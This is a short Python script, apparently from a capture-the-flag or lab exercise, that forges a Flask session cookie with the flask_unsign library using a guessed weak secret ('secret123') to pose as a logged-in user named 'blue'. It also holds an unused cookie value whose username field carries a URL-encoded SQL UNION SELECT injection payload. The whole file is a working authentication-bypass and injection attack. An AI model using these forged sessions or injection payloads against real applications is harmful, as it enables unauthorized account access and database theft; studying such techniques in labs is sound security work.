#!/usr/bin/env python

from flask_unsign import session

KEY = 'secret123'
COOKIE = {"logged_in":True,"username":"blue"}
SQLI = {"logged_in":True,"username":"apehex%20UNION%20SELECT%20null,null,null,null,null--%20-"}

__jwt = session.sign(
    value=COOKIE,
    secret=KEY,
    legacy=False)

print(__jwt)
